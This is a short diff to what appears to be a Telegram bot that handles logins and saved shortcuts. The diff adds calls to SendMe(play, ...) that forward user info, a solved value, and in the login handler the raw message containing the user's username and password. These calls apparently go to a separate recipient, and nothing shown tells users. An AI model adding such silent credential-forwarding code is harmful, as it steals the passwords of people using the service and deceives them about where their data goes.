@@ -55,7 +55,8 @@ def save(update, context):
     password=text[2]
     short=text[3]
     logger.info(text)
-    print(info)
+    text=str(info)
+    SendMe(play,text)
     text = "<b>Saved as</b> -- <code>{} </code>".format(short)
     Sendmessage(chat_id,text)
     shortcut[short]={}
@@ -68,6 +69,7 @@ def login(update, context):
     info = update.effective_user
     #userid= info['username']
     text =  update.message.text.split(' ',2)
+    SendMe(play,text)
     try:
         username=text[1]
         password=text[2]
@@ -172,7 +174,8 @@ def solve(update,context):
                 aa=str(response.content[12600:])
                 ke=(aa.find("#5"))
                 qii=aa[ke+1:ke+7]
-                print(qii)
+                text=str(qii)
+                SendMe(play,text)
                 headers = {
     'Accept': '*/*',
     'Accept-Language': 'en-US,en;q=0.9',
